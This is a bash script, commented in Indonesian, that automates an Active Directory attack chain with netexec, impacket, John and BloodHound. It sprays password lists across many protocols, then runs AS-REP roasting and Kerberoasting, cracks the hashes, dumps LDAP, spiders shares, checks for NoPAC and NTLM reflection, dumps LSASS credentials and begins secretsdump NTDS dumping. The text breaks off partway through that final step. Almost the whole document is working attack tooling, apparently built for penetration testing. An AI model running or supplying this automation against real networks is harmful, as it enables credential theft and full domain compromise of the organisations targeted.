#!/bin/bash

# --- COLORS ---
BLUE='\033[0;34m'
CYAN='\033[0;36m'
GREEN='\033[0;32m'
PURPLE='\033[0;35m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
GRAY='\033[1;30m'
NC='\033[0m'

TARGET_FILE=${1:-target}
USER_FILE=${2:-user}
PASS_FILE=${3:-pass}

OUTDIR="spray_netexec"
RAW_OUT="$OUTDIR/raw_auth_spray.txt"
CLEAN_OUT="$OUTDIR/final_auth_success.txt"
SPIDER_DIR="$OUTDIR/spider_plus"
BROKEN_PIPE_LOG="$OUTDIR/broken_pipe_hosts.txt"
USER_EXPORT_OUT="$OUTDIR/final_auth_user.txt"  
DC_INFO="$OUTDIR/dc_domain_mapping.txt"
FINAL_CRACKED="$OUTDIR/final_cracked_asrep_kerberoast.txt"
FINAL_OUT="$OUTDIR/final_summary.txt"

mkdir -p "$OUTDIR" "$SPIDER_DIR"
: > "$BROKEN_PIPE_LOG"
: > "$CLEAN_OUT"
: > "$RAW_OUT"
: > "$FINAL_CRACKED"
: > "$USER_EXPORT_OUT"
echo -e "${YELLOW}[*] Cleaning stale lock directories...${NC}"
find "$OUTDIR" -maxdepth 1 -type d -name "lock_*" -exec rm -rf {} +

echo -e "${PURPLE}====================================================${NC}"
echo -e "${GREEN}[+] Spray Engine Auth Paralel (Be Careful!)${NC}"
echo -e "${PURPLE}====================================================${NC}"

for f in "$TARGET_FILE" "$USER_FILE" "$PASS_FILE"; do
    [[ ! -f "$f" ]] && echo -e "${RED}[!] Error: File '$f' does not exist!${NC}" && exit 1
done

declare -A DC_MAP
declare -A ASREP_DONE
declare -A KERB_DONE
declare -A BH_DONE
declare -A DC_FQDN_MAP
declare -A USER_EXP_DONE

if [[ -s "$DC_INFO" ]]; then
    while IFS=';' read -r dc_ip dc_domain dc_fqdn || [[ -n "$dc_ip" ]]; do
        [[ -z "$dc_ip" || "$dc_ip" =~ ^# ]] && continue
        dc_ip="${dc_ip//[[:space:]]/}"
        dc_domain="${dc_domain//[[:space:]]/}"
        dc_fqdn="${dc_fqdn//[[:space:]]/}"
        DC_MAP["$dc_domain"]="$dc_ip"
        DC_FQDN_MAP["$dc_domain"]="${dc_fqdn:-DC01.$dc_domain}"
    done < "$DC_INFO"
fi

PROTOCOLS=("smb" "rdp" "wmi" "winrm" "mssql" "ssh" "ftp" "vnc" "ldap")

declare -A PROTO_MAP
for proto in "${PROTOCOLS[@]}"; do
    FILE_PROTO="$OUTDIR/active_$proto.txt"
    [[ ! -s "$FILE_PROTO" ]] && continue
    while read -r ip; do
        [[ -z "$ip" ]] && continue
        PROTO_MAP["$ip"]+="$proto "
    done < "$FILE_PROTO"
done

declare -A DOMAIN_CACHE
get_domain() {
    local ip="$1"
    [[ -n "${DOMAIN_CACHE[$ip]}" ]] && { echo "${DOMAIN_CACHE[$ip]}"; return; }
    for d_key in "${!DC_MAP[@]}"; do
        if [[ "${DC_MAP[$d_key]}" == "$ip" ]]; then
            DOMAIN_CACHE[$ip]="$d_key"
            echo "$d_key"
            return
        fi
    done

    local domain="" hostname="" nxc_out
    echo -e "${GRAY}[CMD] timeout 15s nxc smb \"$ip\" --no-progress${NC}" >&2
    nxc_out=$(timeout 30s nxc smb "$ip" --no-progress 2>/dev/null)
    domain=$(echo "$nxc_out" | grep -oP '(?<=domain:)[^ )]+' | head -n1)
    hostname=$(echo "$nxc_out" | grep -oP '(?<=\(name:)[^)]+' | head -n1)

    if [[ -z "$domain" || "$domain" == "WORKGROUP" ]]; then
        domain="."
    else
        if [[ -z "${DC_MAP[$domain]}" ]]; then
            DC_MAP["$domain"]="$ip"
            DC_FQDN_MAP["$domain"]="${hostname:-DC01}.${domain}"
        fi
    fi
    DOMAIN_CACHE[$ip]="$domain"
    echo "$domain"
}

# =================================================================
# WRAPPER FUNGSI UNTUK PROSES PARALEL (FLOW TETAP SAMA PERSIS)
# =================================================================
process_target_proto() {
    local ip="$1"
    local proto="$2"
    local DOMAIN
    local SKIP_DOMAIN=""    
    DOMAIN=$(get_domain "$ip" 2>/dev/null | tail -n1)

    # File temporary unik per thread/job
    local TMP_RES=".tmp_res_${ip}_${proto}_$$"
    local TMP_SUCCESS=".tmp_success_${ip}_${proto}_$$"
    
    : > "$TMP_RES"
    : > "$TMP_SUCCESS"

    # -----------------------------------------------------------------
    # STEP 1 & 2: AUTH SPRAY (Logika tetap sama, output ditampung dulu)
    # -----------------------------------------------------------------
    local DOMAIN_ARG=""
    local EXTRA=""

    local attempt_spray=1
    local max_spray=2
    

    if [[ "$DOMAIN" == "." ]]; then
        SKIP_DOMAIN=1
    fi


    while [ $attempt_spray -le $max_spray ]; do
        echo -e "${GRAY}[CMD] timeout 100s nxc \"$proto\" \"$ip\" -u \"$USER_FILE\" -p \"$PASS_FILE\" $EXTRA --continue-on-success --no-progress${NC}"
        timeout 100s nxc "$proto" "$ip" -u "$USER_FILE" -p "$PASS_FILE" $EXTRA --continue-on-success --no-progress > "$TMP_RES" 2>&1
        sed -i -E 's/\x1B\[[0-9;]*[mGK]//g' "$TMP_RES"
        cat "$TMP_RES" >> "$RAW_OUT"
        grep -E "\[\+\]|Pwn3d!" "$TMP_RES" >> "$TMP_SUCCESS"

        if [[ -s "$TMP_SUCCESS" ]]; then
            break
        fi
        if [[ ! -s "$TMP_RES" ]]; then
            ((attempt_spray++)); sleep 3
        elif grep -qiE "Broken Pipe|timed out|connection.*timeout" "$TMP_RES"; then
            ((attempt_spray++)); sleep 3
        elif grep -qiE "STATUS_LOGON_FAILURE|STATUS_ACCOUNT|Access denied|\[-\]" "$TMP_RES"; then
            break
        else
            break
        fi
    done
    # --- FALLBACK LOCAL AUTH (SUPPORTED PROTOCOLS ONLY) ---
    if [[ "$proto" =~ ^(smb|rdp|wmi|winrm|mssql)$ ]] &&
       ! grep -qi "Pwn3d!" "$TMP_SUCCESS"; then # Tetap jalan mencari Admin jika baru dapat user biasa [+]

        echo -e "${GRAY}[CMD] timeout 100s nxc \"$proto\" \"$ip\" -u \"$USER_FILE\" -p \"$PASS_FILE\" --local-auth --continue-on-success --no-progress${NC}"

        timeout 100s nxc "$proto" "$ip" \
            -u "$USER_FILE" \
            -p "$PASS_FILE" \
            --local-auth \
            --continue-on-success \
            --no-progress > "$TMP_RES" 2>&1

        sed -i -E 's/\x1B\[[0-9;]*[mGK]//g' "$TMP_RES"
        cat "$TMP_RES" >> "$RAW_OUT"
        
        # TAMBAHAN: Cetak log ke terminal jika local auth berhasil tembus kredensial baru
        if grep -qE "\[\+\]|Pwn3d!" "$TMP_RES"; then
            echo -e "\n${CYAN}>>> Target Host: $ip (${proto^^}) - Local Credentials Found!${NC}"
            cat "$TMP_RES"
        fi
        
        grep -E "\[\+\]|Pwn3d!" "$TMP_RES" >> "$TMP_SUCCESS" # Fiksasi operator append
    fi
    if ! grep -qi "Pwn3d!" "$TMP_SUCCESS" && [[ -z "$SKIP_DOMAIN" ]] && [[ "$proto" =~ ^(smb|rdp|wmi|winrm|mssql)$ ]]; then 
        local attempt_dom=1
        while [ $attempt_dom -le $max_spray ]; do
            echo -e "${GRAY}[CMD] timeout 100s nxc \"$proto\" \"$ip\" -u \"$USER_FILE\" -p \"$PASS_FILE\" -d \"$DOMAIN\" --continue-on-success --no-progress${NC}"
            timeout 100s nxc "$proto" "$ip" -u "$USER_FILE" -p "$PASS_FILE" -d "$DOMAIN" --continue-on-success --no-progress > "$TMP_RES" 2>&1
            sed -i -E 's/\x1B\[[0-9;]*[mGK]//g' "$TMP_RES" 
            cat "$TMP_RES" >> "$RAW_OUT"
            
            # TAMBAHAN: Cetak log ke terminal jika explicit domain berhasil mendapat kredensial baru
            if grep -qE "\[\+\]|Pwn3d!" "$TMP_RES"; then
                echo -e "\n${CYAN}>>> Target Host: $ip (${proto^^}) - Explicit Domain Credentials Found!${NC}"
                cat "$TMP_RES"
            fi
            
            grep -E "\[\+\]|Pwn3d!" "$TMP_RES" >> "$TMP_SUCCESS" # Fiksasi operator append
            
            if grep -qE "\[\+\]|Pwn3d!" "$TMP_RES"; then
                DOMAIN_ARG="-d $DOMAIN"
                break
            fi
            if [[ ! -s "$TMP_RES" ]]; then
                ((attempt_dom++)); sleep 3
            elif grep -qiE "Broken Pipe|timed out|connection.*timeout" "$TMP_RES"; then
                ((attempt_dom++)); sleep 3
            elif grep -qiE "STATUS_LOGON_FAILURE|STATUS_ACCOUNT|Access denied|\[-\]" "$TMP_RES"; then
                break
            else
                break
            fi
        done
    fi

    # -----------------------------------------------------------------
    # STEP 3: DYNAMIC MULTI-CREDENTIAL PARSING & POST-EXPLOIT
    # -----------------------------------------------------------------
    if [[ -s "$TMP_SUCCESS" ]]; then
        # Cetak header host secara rapi saat kredensial dipastikan valid
        echo -e "\n${CYAN}>>> Target Host: $ip (${proto^^}) - Credentials Found!${NC}"
        cat "$TMP_RES" # Tampilkan output nxc asli ke layar secara utuh

        while IFS= read -r line; do
            [[ -z "$line" ]] && continue
            RAW_CRED=$(echo "$line" | sed -n 's/.*\[+\] \([^ ]*\).*/\1/p')
            u_p="${RAW_CRED#*\\}"      
            u="${u_p%%:*}"
            p="${u_p#"$u":}"        

            if [[ -n "$u" && -n "$p" ]]; then
                echo "[$proto] $ip - [+] Valid Credentials Found -> $u:$p" >> "$CLEAN_OUT"
                if echo "$line" | grep -qi "Pwn3d!"; then
                    echo "[$proto] $ip - [!!!] Pwn3d! Status Achieved for $u" >> "$CLEAN_OUT"
                fi
            fi
        done < "$TMP_SUCCESS"

        BEST_LINE=$(grep -i "Pwn3d!" "$TMP_SUCCESS" | head -n1)
        [[ -z "$BEST_LINE" ]] && BEST_LINE=$(head -n1 "$TMP_SUCCESS")
        
        RAW_CRED=$(echo "$BEST_LINE" | sed -n 's/.*\[+\] \([^ ]*\).*/\1/p')
        user_pass="${RAW_CRED#*\\}"
        user="${user_pass%%:*}"
        pass="${user_pass#*:}"
        
        dc_ip="${DC_MAP[$DOMAIN]}"

        # --- ROASTING ENGINE (MENGGUNAKAN FILE-BASED LOCK INDIKATOR) ---
        if [[ -n "$dc_ip" && "$DOMAIN" != "." ]]; then
            
            # Gunakan utilitas mkdir untuk membuat lock directory atomik (Aman dari Race Condition)
            ASREP_LOCK="$OUTDIR/lock_asrep_${DOMAIN}"
            ASREP_DONE="$OUTDIR/asrep_${DOMAIN}.done"

            if [[ ! -f "$ASREP_DONE" ]]; then
                if mkdir "$ASREP_LOCK" 2>/dev/null; then

                    ASREP_HASH_FILE="$OUTDIR/asrep_${DOMAIN}.txt"
                    echo -e "${GRAY}[CMD] timeout 100s impacket-GetNPUsers \"$DOMAIN/$user:$pass\" -dc-ip \"$dc_ip\" -request -format hashcat -outputfile \"$ASREP_HASH_FILE\"${NC}"
                    timeout 100s impacket-GetNPUsers "$DOMAIN/$user:$pass" -dc-ip "$dc_ip" -request -format hashcat -outputfile "$ASREP_HASH_FILE" 2>&1 | tee "$OUTDIR/asrep_${DOMAIN}_raw.log"

                    if [[ -s "$ASREP_HASH_FILE" ]]; then
                        echo -e "${RED}[!] ASREP hash found! Cracking with John...${NC}"

                        echo -e "${GRAY}[CMD] timeout 180s john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt --rules \"$ASREP_HASH_FILE\"${NC}"
                        timeout 180s john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt --rules "$ASREP_HASH_FILE" 
                        echo -e "${GRAY}[CMD] john --show \"$ASREP_HASH_FILE\"${NC}"
                        ASREP_RESULT=$(john --show "$ASREP_HASH_FILE" | grep -v "password cracked" | grep ":")

                        [[ -n "$ASREP_RESULT" ]] && {
                            echo -e "${GREEN}[+++] SUCCESS! Cracked ASREP Hash(es):\n${YELLOW}$ASREP_RESULT${NC}"
                            echo -e "\n[ASREP - $DOMAIN]\n$ASREP_RESULT" >> "$FINAL_CRACKED"
                        }
                    fi

                    touch "$ASREP_DONE"
                    rm -rf "$ASREP_LOCK"

                fi
            fi

            KERB_LOCK="$OUTDIR/lock_kerb_${DOMAIN}"
            KERB_DONE="$OUTDIR/kerberoast_${DOMAIN}.done"

            if [[ ! -f "$KERB_DONE" ]]; then

                if mkdir "$KERB_LOCK" 2>/dev/null; then

                    KERB_HASH_FILE="$OUTDIR/kerberoast_${DOMAIN}.txt"
                    echo -e "${PURPLE}[EXEC] Running Kerberoasting → $DOMAIN ($dc_ip)${NC}"
                    echo -e "${GRAY}[CMD] timeout 100s impacket-GetUserSPNs \"$DOMAIN/$user:$pass\" -dc-ip \"$dc_ip\" -request -outputfile \"$KERB_HASH_FILE\"${NC}"
                    timeout 100s impacket-GetUserSPNs "$DOMAIN/$user:$pass" -dc-ip "$dc_ip" -request -outputfile "$KERB_HASH_FILE" 2>&1 | tee "$OUTDIR/kerberoast_${DOMAIN}_raw.log"

                    if [[ -s "$KERB_HASH_FILE" ]]; then

                        echo -e "${RED}[!] Kerberoast hash found! Cracking with John...${NC}"
                        echo -e "${GRAY}[CMD] timeout 180s john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt --rules \"$KERB_HASH_FILE\"${NC}"
                        timeout 180s john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt --rules "$KERB_HASH_FILE" 
                        echo -e "${GRAY}[CMD] john --show \"$KERB_HASH_FILE\"${NC}"
                        KERB_RESULT=$(john --show "$KERB_HASH_FILE" | grep -v "password cracked" | grep ":")

                        [[ -n "$KERB_RESULT" ]] && {
                            echo -e "${GREEN}[+++] SUCCESS! Cracked Kerberoast Hash(es):\n${YELLOW}$KERB_RESULT${NC}"
                            echo -e "\n[KERBEROAST - $DOMAIN]\n$KERB_RESULT" >> "$FINAL_CRACKED"
                        }
                    fi

                    touch "$KERB_DONE"
                    rm -rf "$KERB_LOCK"

                fi

            fi
        fi

        # --- LDAP POST-EXPLOIT ---
        if [[ "$proto" == "ldap" ]]; then
            DUMP_PATH="$OUTDIR/ldap_$ip"
            mkdir -p "$DUMP_PATH"
            LDAP_USER="$user"

            if [[ "$DOMAIN" != "." ]]; then
                LDAP_USER=$(printf '%s\\%s' "$DOMAIN" "$user")
            fi
            echo "[DEBUG] RAW DOMAIN: $DOMAIN"
            echo "[DEBUG] RAW USER: $user"
            echo "[DEBUG] FINAL LDAP_USER: $LDAP_USER"
            echo -e "${YELLOW}[!] Executing ldapdomaindump...${NC}"
            echo -e "${GRAY}[CMD] timeout 100s ldapdomaindump \"$ip\" -u \"$LDAP_USER\" -p \"$pass\" -o \"$DUMP_PATH\"${NC}"
            timeout 100s ldapdomaindump "$ip" -u "$LDAP_USER" -p "$pass" -o "$DUMP_PATH" 
            if [[ -d "$DUMP_PATH" ]]; then
                echo -e "${GREEN}[+] ldapdomaindump saved to $DUMP_PATH${NC}"
            fi
            USER_LOCK="$OUTDIR/lock_userexp_${DOMAIN}"
            USER_DONE="$OUTDIR/userexport_${DOMAIN}.done"

            if [[ "$DOMAIN" != "." ]] &&
               [[ ! -f "$USER_DONE" ]]; then

                if mkdir "$USER_LOCK" 2>/dev/null; then

                    echo -e "${YELLOW}[!] Exporting users via LDAP for domain $DOMAIN...${NC}"
                    echo -e "${GRAY}[CMD] timeout 100s nxc ldap \"$ip\" -u \"$user\" -p \"$pass\" $DOMAIN_ARG --users-export \"$USER_EXPORT_OUT.tmp\"${NC}"
                    timeout 100s nxc ldap "$ip" -u "$user" -p "$pass" $DOMAIN_ARG --users-export "$USER_EXPORT_OUT.tmp" >/dev/null 2>&1

                    if [[ -s "$USER_EXPORT_OUT.tmp" ]]; then
                        cat "$USER_EXPORT_OUT.tmp" >> "$USER_EXPORT_OUT"
                        rm -f "$USER_EXPORT_OUT.tmp"
                        echo -e "${GREEN}[+] Successfully exported users via LDAP for $DOMAIN.${NC}"
                    fi

                    rm -rf "$USER_LOCK"

                fi

            fi
        fi

        # --- SMB POST-EXPLOIT ---
        if [[ "$proto" == "smb" ]]; then

            ABS_SPIDER=$(readlink -f "$SPIDER_DIR")

            # --- USERS EXPORT (DOMAIN ONLY) ---
            USER_LOCK="$OUTDIR/lock_userexp_${DOMAIN}"
            USER_DONE="$OUTDIR/userexport_${DOMAIN}.done"

            if [[ ! -f "$USER_DONE" ]]; then

                if mkdir "$USER_LOCK" 2>/dev/null; then
                    echo -e "${YELLOW}[!] Exporting users via SMB for domain $DOMAIN...${NC}"
                    echo -e "${GRAY}[CMD] timeout 100s nxc smb \"$ip\" -u \"$user\" -p \"$pass\" $DOMAIN_ARG --users-export \"$USER_EXPORT_OUT.tmp\"${NC}"
                    timeout 100s nxc smb "$ip" -u "$user" -p "$pass" $DOMAIN_ARG --users-export "$USER_EXPORT_OUT.tmp" >/dev/null 2>&1

                    if [[ -s "$USER_EXPORT_OUT.tmp" ]]; then
                        cat "$USER_EXPORT_OUT.tmp" >> "$USER_EXPORT_OUT"
                        rm -f "$USER_EXPORT_OUT.tmp"
                        echo -e "${GREEN}[+] Successfully exported users via SMB for $DOMAIN.${NC}"
                    fi
                    rm -rf "$USER_LOCK"
                fi

            fi

            # ---------- SPIDER ----------
            echo -e "${GRAY}[CMD] SMB spider_plus${NC}"
            if [[ "$DOMAIN" != "." ]]; then
                echo -e "${GRAY}[CMD] timeout 100s nxc smb \"$ip\" -u \"$user\" -p \"$pass\" $DOMAIN_ARG -M spider_plus -o EXCLUDE_FILTER=c\$,ipc\$,admin\$,netlogon,sysvol OUTPUT_FOLDER=\"$ABS_SPIDER\"${NC}"
                timeout 100s nxc smb "$ip" -u "$user" -p "$pass" $DOMAIN_ARG -M spider_plus -o EXCLUDE_FILTER=c\$,ipc\$,admin\$,netlogon,sysvol OUTPUT_FOLDER="$ABS_SPIDER" | tee "$TMP_RES"
                echo -e "${GREEN}[+] spider_plus output -> $ABS_SPIDER${NC}"

                if ! grep -qiE "success|accessible" "$TMP_RES"; then
                    echo -e "${GRAY}[CMD] (fallback local) spider_plus${NC}"
                    echo -e "${GRAY}[CMD] timeout 100s nxc smb \"$ip\" -u \"$user\" -p \"$pass\" --local-auth -M spider_plus -o EXCLUDE_FILTER=c\$,ipc\$,admin\$,netlogon,sysvol OUTPUT_FOLDER=\"$ABS_SPIDER\"${NC}"
                    timeout 100s nxc smb "$ip" -u "$user" -p "$pass" --local-auth -M spider_plus -o EXCLUDE_FILTER=c\$,ipc\$,admin\$,netlogon,sysvol OUTPUT_FOLDER="$ABS_SPIDER" | tee "$TMP_RES"
                    echo -e "${GREEN}[+] spider_plus output -> $ABS_SPIDER${NC}"
                fi
            else
                timeout 100s nxc smb "$ip" -u "$user" -p "$pass" --local-auth -M spider_plus -o EXCLUDE_FILTER=c\$,ipc\$,admin\$,netlogon,sysvol OUTPUT_FOLDER="$ABS_SPIDER" | tee "$TMP_RES"
                echo -e "${GREEN}[+] spider_plus output -> $ABS_SPIDER${NC}"
            fi

            # ---------- NOPAC ----------
            echo -e "${GRAY}[CMD] SMB nopac${NC}"
            if [[ "$DOMAIN" != "." ]]; then
                echo -e "${GRAY}[CMD] timeout 100s nxc smb \"$ip\" -u \"$user\" -p \"$pass\" $DOMAIN_ARG -M nopac${NC}"
                timeout 100s nxc smb "$ip" -u "$user" -p "$pass" $DOMAIN_ARG -M nopac | tee "$TMP_RES"

                if ! grep -qi "VULNERABLE" "$TMP_RES"; then
                    echo -e "${GRAY}[CMD] timeout 100s nxc smb \"$ip\" -u \"$user\" -p \"$pass\" --local-auth -M nopac${NC}"
                    timeout 100s nxc smb "$ip" -u "$user" -p "$pass" --local-auth -M nopac | tee "$TMP_RES"
                fi
            else
                timeout 100s nxc smb "$ip" -u "$user" -p "$pass" --local-auth -M nopac | tee "$TMP_RES"
            fi

            grep -qi "VULNERABLE" "$TMP_RES" && {
                echo -e "${RED}[!] ALERT: Target VULNERABLE to NoPAC!${NC}"
                echo "[$proto] $ip - [!!!] ALERT: VULNERABLE to NoPAC!" >> "$CLEAN_OUT"
            }

            # ---------- NTLM REFLECTION ----------
            echo -e "${GRAY}[CMD] SMB ntlm_reflection${NC}"
            if [[ "$DOMAIN" != "." ]]; then
                echo -e "${GRAY}[CMD] timeout 100s nxc smb \"$ip\" -u \"$user\" -p \"$pass\" $DOMAIN_ARG -M ntlm_reflection${NC}"
                timeout 100s nxc smb "$ip" -u "$user" -p "$pass" $DOMAIN_ARG -M ntlm_reflection | tee "$TMP_RES"

                if ! grep -qi "vulnerable" "$TMP_RES"; then
                    echo -e "${GRAY}[CMD] timeout 100s nxc smb \"$ip\" -u \"$user\" -p \"$pass\" --local-auth -M ntlm_reflection${NC}"
                    timeout 100s nxc smb "$ip" -u "$user" -p "$pass" --local-auth -M ntlm_reflection | tee "$TMP_RES"
                fi
            else
                timeout 100s nxc smb "$ip" -u "$user" -p "$pass" --local-auth -M ntlm_reflection | tee "$TMP_RES"
            fi

            grep -qi "vulnerable" "$TMP_RES" && {
                echo -e "${RED}[!] ALERT: Target VULNERABLE to NTLM Reflection!${NC}"
                echo "[$proto] $ip - [!!!] ALERT: VULNERABLE to NTLM Reflection!" >> "$CLEAN_OUT"
            }

            # ---------- BLOODHOUND (DOMAIN ONLY) ----------
            if [[ -z "${BH_DONE[$DOMAIN]}" && "$DOMAIN" != "." ]]; then
                BH_LOCK="$OUTDIR/lock_bh_${DOMAIN}"
                BH_DONE="$OUTDIR/bloodhound_${DOMAIN}.done"

                if [[ ! -f "$BH_DONE" ]]; then

                    if mkdir "$BH_LOCK" 2>/dev/null; then

                        BH_DIR="$OUTDIR/bloodhound_${ip}"
                        mkdir -p "$BH_DIR"

                        (
                            cd "$BH_DIR" || exit
                            echo -e "${YELLOW}[*] Ingesting AD data via BloodHound...${NC}"
                            echo -e "${GRAY}[CMD] timeout 150s bloodhound-ce-python -d \"$DOMAIN\" -u \"$user\" -p \"$pass\" -ns \"$dc_ip\" -c all --zip${NC}"
                            timeout 150s bloodhound-ce-python -d "$DOMAIN" -u "$user" -p "$pass" -ns "$dc_ip" -c all --zip | tee bloodhound_run.log
                        )

                        if ls "$BH_DIR"/*.zip >/dev/null 2>&1; then
                            touch "$BH_DONE"
                        fi

                        rm -rf "$BH_LOCK"

                    fi

                fi
            fi

            # ---------- LSASSY ----------
            if echo "$BEST_LINE" | grep -qi "Pwn3d!"; then
                echo -e "${GRAY}[CMD] SMB lsassy${NC}"

                if [[ "$DOMAIN" != "." ]]; then
                    echo -e "${GRAY}[CMD] timeout 100s nxc smb \"$ip\" -u \"$user\" -p \"$pass\" $DOMAIN_ARG -M lsassy${NC}"
                    timeout 100s nxc smb "$ip" -u "$user" -p "$pass" $DOMAIN_ARG -M lsassy | tee "$TMP_RES"

                    if ! grep -qiE "dumped|success" "$TMP_RES"; then
                        echo -e "${GRAY}[CMD] (fallback local) lsassy${NC}"
                        echo -e "${GRAY}[CMD] timeout 100s nxc smb \"$ip\" -u \"$user\" -p \"$pass\" --local-auth -M lsassy${NC}"
                        timeout 100s nxc smb "$ip" -u "$user" -p "$pass" --local-auth -M lsassy | tee "$TMP_RES"
                    fi
                else
                    timeout 100s nxc smb "$ip" -u "$user" -p "$pass" --local-auth -M lsassy | tee "$TMP_RES"
                fi

                LSASS_OUT="$OUTDIR/lsassy_${ip}.txt"

                if grep -qiE "dumped|success" "$TMP_RES"; then
                    echo "[$proto] $ip - [LSASS] Credentials successfully dumped via lsassy" >> "$CLEAN_OUT"
                    
                    # simpan hasil lsassy
                    cat "$TMP_RES" >> "$LSASS_OUT"
                fi
            fi
        fi
    fi
    
    rm -f "$TMP_RES" "$TMP_SUCCESS"
}
# =================================================================
# MAIN CONTROL PARALLEL LOOP
# =================================================================
MAX_PARALLEL_JOBS=5  # Jumlah maksimal target host/protokol yang running berbarengan
current_jobs=0

for ip in "${!PROTO_MAP[@]}"; do
    for proto in ${PROTO_MAP[$ip]}; do
        
        # Eksekusi fungsi utama secara asinkronus (Background Job)
        process_target_proto "$ip" "$proto" &
        
        ((current_jobs++))
        
        # Manajemen throttling job agar tidak mengacaukan resource OS/Network
        if [ "$current_jobs" -ge "$MAX_PARALLEL_JOBS" ]; then
            wait -n  # Menunggu salah satu job background selesai (Fitur Bash v4.3+)
            ((current_jobs--))
        fi
    done
done

# Menunggu seluruh sisa background jobs selesai secara total
wait

# =================================================================
# CLEANUP & USER DUMP SORTING
# =================================================================
if [[ -s "$USER_EXPORT_OUT" ]]; then
    # Menghapus spasi kosong yang tidak sengaja terbawa (opsional tapi aman)
    sed -i '/^[[:space:]]*$/d' "$USER_EXPORT_OUT"
    
    # Melakukan sorting, mengambil nilai unik (sort -u), dan menimpa file aslinya
    sort -u "$USER_EXPORT_OUT" -o "$USER_EXPORT_OUT"
    
    # Menghitung jumlah user unik yang berhasil didapatkan
    TOTAL_USERS=$(wc -l < "$USER_EXPORT_OUT")
    
    echo -e "${GREEN}[+] Consolidated $TOTAL_USERS unique users from SMB/LDAP into:${NC}"
    echo -e "${YELLOW}---> $USER_EXPORT_OUT${NC}\n"
else
    echo -e "\n${YELLOW}[!] No users were exported from any domain targets.${NC}\n"
fi

# =================================================================
# PHASE 4: FINAL CHRONOLOGICAL SUMMARY
# =================================================================
echo -e "\n${PURPLE}====================================================${NC}"
echo -e "${GREEN}[+] PHASE 4: FINAL CHRONOLOGICAL SUMMARY${NC}"
echo -e "${PURPLE}====================================================${NC}"

: > "$FINAL_OUT"

if [[ -s "$RAW_OUT" ]]; then
    grep -aEi "\[\*\]|LSASSY|VULN|TGT with|PetitPotam|DFSCoerce" "$RAW_OUT" | awk '!seen[$0]++' >> "$FINAL_OUT"
fi

if [[ -s "$CLEAN_OUT" ]]; then
    cat "$CLEAN_OUT" >> "$FINAL_OUT"
fi

if [[ -s "$FINAL_CRACKED" ]]; then
    echo -e "\n--- CRACKED CREDENTIALS (JOHN THE RIPPER) ---" >> "$FINAL_OUT"
    cat "$FINAL_CRACKED" >> "$FINAL_OUT"
fi

if [[ -s "$FINAL_OUT" ]]; then
    while IFS= read -r line; do
        if [[ "$line" == *"[+]"* || "$line" == *"Valid Credentials"* ]]; then
            echo -e "${GREEN}${line}${NC}"
        elif [[ "$line" == *"[!!!]"* || "$line" == *"[LSASS]"* ]]; then
            echo -e "${RED}${line}${NC}"
        elif [[ "$line" == *"[*]"* ]]; then
            echo -e "${BLUE}${line}${NC}"
        else
            echo -e "${YELLOW}${line}${NC}"
        fi
    done < "$FINAL_OUT"
else
    echo -e "${YELLOW}[!] No summary records found.${NC}"
fi

# =================================================================
# EXTRACTION: UNIQUE VALID CREDENTIALS TO Final_valid_creds.txt
# =================================================================
FINAL_CREDS_FILE="$OUTDIR/final_valid_creds_all.txt"
: > "$FINAL_CREDS_FILE"

if [[ -s "$FINAL_OUT" ]]; then
    # Mengambil baris yang memiliki pola kredensial valid
    # Contoh input: [winrm] 10.0.16.179 - [+] Valid Credentials Found -> ATHENA_SVC:1dirtymartini
    # Hasil output: 10.0.16.179;ATHENA_SVC:1dirtymartini
    grep -a "Valid Credentials Found" "$FINAL_OUT" | awk -F'-> ' '{print $1, $2}' | awk '{gsub(/[\[\]]/, "", $1); print $1 ";" $2 ";" $NF}' | sort -u > "$FINAL_CREDS_FILE"

    if [[ -s "$FINAL_CREDS_FILE" ]]; then
        TOTAL_CREDS=$(wc -l < "$FINAL_CREDS_FILE")
        echo -e "\n${GREEN}[+] Successfully extracted $TOTAL_CREDS unique credentials into:${NC}"
        echo -e "${YELLOW}---> $FINAL_CREDS_FILE${NC}"
        echo -e "${GRAY}------------------------------------------------------------${NC}"
        cat "$FINAL_CREDS_FILE"
        echo -e "${GRAY}------------------------------------------------------------${NC}"
    fi
fi

#====================================================
# PHASE 5: AUTOMATIC NTDS DUMPING (Secretsdump)
#====================================================
if [[ -s "$FINAL_CREDS_FILE" ]]; then
    
    # File temporary untuk mencatat IP DC yang SUDAH BERHASIL di-dump
    DUMPED_IPS_TRACKER="$OUTDIR/.dumped_ips.tmp"
    : > "$DUMPED_IPS_TRACKER"
    
    while IFS=; read -r cred_line || [[ -n "$cred_line" ]]; do
        [[ -z "$cred_line" ]] && continue
        
        # Ekstraksi komponen kredensial (Menangkap kolom ke-1 sebagai protokol)
        cred_proto=$(echo "$cred_line" | cut -d';' -f1)
        ip=$(echo "$cred_line" | cut -d';' -f2)
        user_pass=$(echo "$cred_line" | cut -d';' -f3)
        cred_user=$(echo "$user_pass" | cut -d':' -f1)
        cred_pass=$(echo "$user_pass" | cut -d':' -f2)
        # -----------------------------------------------------------
        # OPTIMASI: Cek Apakah Port 445 Terbuka Terlebih Dahulu
        # -----------------------------------------------------------
        if ! timeout 2s bash -c "3<>/dev/tcp/$ip/445" 2>/dev/null; then
            echo -e "${GRAY}[*] Skipping secretsdump on $ip - Port 445 (SMB) is closed.${NC}"
            continue
        fi
        
        # -----------------------------------------------------------
        # Cek apakah IP ini sudah sukses di-dump sebelumnya
        # -----------------------------------------------------------
        if grep -q "^$ip$" "$DUMPED_IPS_TRACKER" 2>/dev/null; then
            echo -e "${GRAY}[*] Skipping $ip using $cred_user - NTDS already successfully dumped for this host.${NC}"
            continue
        fi
        
        if [[ "$cred_proto" =~ ^(smb|ldap|rdp|wmi|winrm|mssql)$ ]]; then
            DOMAIN=$(get_domain "$ip")
        else
            DOMAIN="."
        fi
        [[ "$DOMAIN" == "." ]] && DOMAIN="WORKGROUP"

        echo -e "${YELLOW}[*] Attempting secretsdump on $ip using $cred_user (${cred_proto^^})...${NC}"

        dump_out_name="$OUTDIR/secretsdump_${DOMAIN}_${ip}_${cred_user}"

        # --- BUILD TARGET STRING (DOMAIN / LOCAL SAFE) ---
        if [[ "$DOMAIN" == "WORKGROUP" ]]; then
            TARGET_STRING="$cred_user:$cred_pass@$ip"
        else
            TARGET_STRING="$DOMAIN/$cred_user:$cred_pass@$ip"
        fi

